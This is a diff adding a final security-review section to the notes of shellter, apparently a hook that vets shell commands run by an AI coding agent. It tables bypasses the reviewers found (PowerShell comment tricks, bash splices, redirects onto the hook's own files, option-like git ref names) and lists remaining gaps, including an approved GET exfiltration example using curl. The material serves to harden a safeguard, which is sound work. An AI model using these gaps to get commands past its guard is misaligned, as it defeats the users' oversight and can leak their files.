@@ -270,6 +270,75 @@ open. Each is fixed once, where every caller routes through. A differential fuzz
 Corrections to earlier text: PowerShell member calls were not closed by round 2 (F9); `?env` falls
 through, it does not deny.
 
+## Sixth review - final (v0.11.0, 2026-11-19)
+
+Two reviewers ran about 1,400 probes against the round-3 head, bash and PowerShell behaviour confirmed in
+real shells on marker commands. Seven bash-side and three file-side blockers, all fixed.
+
+| Finding | v0.11.0 round 3 | v0.11.0 |
+| --- | --- | --- |
+| B1 PowerShell: a lone CR ends a comment, the approve view read on to LF | allow | fallthrough |
+| B2 PowerShell: `#` after a backtick-escaped space, `;`, `\|`, `(`, newline read as a comment | allow | fallthrough |
+| B3 `${F:=x}` in a heredoc body, `[[ ]]`, a `for` list, a `case` word | allow | fallthrough |
+| B4 `$_`, `BASH_REMATCH` (and `REPLY`, `PIPESTATUS`, `BASH_*`, ...) read as environment names | allow | fallthrough |
+| B5 array-assignment subscript `y=([x]=1)` not arithmetic | allow | fallthrough |
+| B6 a word-less redirect, `&>`, a glob in a target or a directory, a loop / xargs / dirname / symlink onto shellter's files | allow | deny (resolved target) / fallthrough |
+| B7 git with a revision from `$( )` prompted (11 of 267 everyday commands) | fallthrough | allow for commit ids (`rev-parse`, `merge-base`) and `--since=`-style values; ref names still prompt |
+| F B1 reversed range `[post-id]` read as "secret" | deny | allow / fallthrough |
+| F B2 POSIX classes `[[:alpha:]]`, `[[=e=]]`, `[[.e.]]` | allow | deny |
+| F B3 a project's own `.claude/hooks/package.json` | deny | fallthrough (only `~/.claude/hooks/package.json` and the running hooks' own) |
+
+B6 detail: a target is matched component-wise, each glob component standing for every protected name it
+matches; past 256 expansions it denies when a component can be `.claude` and asks when the last can name an rc file. Paths are normalised (`./`, `..`,
+`//`) first. A command whose words name `~/.claude` itself, any `.claude/hooks` or `.claude/plugins`, or a
+glob below a `.claude` approves no non-reader with an unread argument or one naming them after it, and no
+redirect (`>&` too) to an unread or glob target or into them; an `ln`
+naming them, or a `cd` into a `.claude`, also stops literal redirects. B7 detail: a revision producer is
+`git rev-parse` (`--short`, `--verify`, `-q`) or `merge-base A B`: a commit id, never a leading `-`. Ref-name
+producers (`--abbrev-ref`, `describe`, `branch --show-current`, `symbolic-ref`) are not trusted: a fetched ref
+can be named `--upload-pack=x` or `--output=x`. The value is trusted only as a git argument (`date` output follows `TZ`). With an unread or derived argument, `--ext-diff`,
+`--textconv`, `--output`, `--no-index`, `-c`, `-C`, `--git-dir`, `--work-tree`, `-o`, `-u`, `-O`,
+`--upload-pack` and friends refuse; an unread `-C` value alone does not. A git value-only option
+(`--since="$d"`) takes an unread quoted value. A name set from a producer on one branch only is unread.
+
+Code review of these fixes (high): a glob overflow skipped the raw-path check; `date` and refs as
+never-dash values outside git; non-normal spellings of the hooks dir; `-C` / `--git-dir` with an unread
+revision; a conditional merge that dropped the producer marker; `ls ~/.claude/hooks > /tmp/list` prompting.
+Second pass (medium): `>&` missing from the redirect check; a nested array subscript (`y=([a[x]]=1)`);
+ref-name producers trusted; a glob overflow asking outside `.claude`; `ls ~/.claude/plugins; npm test`
+prompting; the hooks `package.json` deny not normalised. All fixed and pinned.
+
+### Accepted limits (final review)
+
+- **A watchdog worker that exits non-zero without an `error` event** falls through. Not reachable: the hooks
+  exit 0 only.
+- **A message-flag value** (`-m`, `-b`, `-t` after any exec-capable command, `tar -m "$n"`, `git diff -b "$n"`)
+  is exempt from the unread-argument rule, and the value can be an option.
+- **A quoted argument behind a literal prefix** (`curl -o "out/$n"`) approves; the value can hold `../`.
+- **GET exfiltration of a non-secret file** (`curl "http://host/?q=$(cat f.txt)"`) approves; the `-d` form denies.
+- **A default-value splice hides a secret name from copy and archive verbs** (`cp .e${x:-n}v out.txt`): the read
+  verbs fall through. Same reach as `grep -r` and `cp -r .`.
+- **Redirect writes to `~/.gitconfig`, `.git/config`, `~/.claude.json`** approve; `cat > .gitconfig <<EOF`
+  denies. General write-target classification is deferred.
+- **`ls.exe`, `rg.exe`, `cat.exe f.txt`** fall through (F8: the command word must be the tool's own name).
+- **A write target from an unread value** (`d=$(cat f); cp x "$d/check-bash.js"`), a relative `.claude` after
+  `cd ~`, and a path the command builds byte by byte are not traced: self-protection is not a sandbox.
+- **git with a ref name from a substitution prompts** (`git log "$(git branch --show-current)"`): a cloned
+  repository's ref can be named like a git option.
+- **After a word naming `~/.claude/hooks`, a non-reader with an unread argument prompts**, a nested array
+  subscript prompts, and a git command in another repository with an unread argument prompts.
+- **`${F:=x}` over a value the walker cannot prove non-empty** makes F unread, also when bash would keep it.
+- **The patch parser is quadratic on one very long header line** (40 KB: about 1 s; 250 KB through the codex
+  shim: past codex's 30 s). It runs in the shim, outside the watchdog. Same outcome as the many-target limit.
+- **A 30-file patch takes about 20 s through the shim** (one hook per target, 0.65 s a spawn on the reviewer's
+  machine).
+- **More than 2,000 tracked depth-2 names with `~`, `:`, a non-ASCII character or a trailing dot**: the trust
+  check gives up on alias resolution and the untracked `settings.local.json` is not honoured (its scripts ask).
+- **`merge-settings.js` replaces an existing `~/.claude/hooks/package.json`** with `{"type":"commonjs"}`.
+- **Glob `.npm*`, `.np*`, `**/.net*` deny** (literal prefix of `.npmrc` / `.netrc`, intended).
+- **A Write of this repository's own `CHANGELOG.md` denies**: the entry quotes an encoded-exec call form.
+- **CI has not run the two new gates on hosted runners**; `test-perf.js` has a 3 s wall-clock bound.
+
 ## Read the verdict labels precisely
 
 shellter is deny → script-scan → ask → approve → **fallthrough**. A finding's
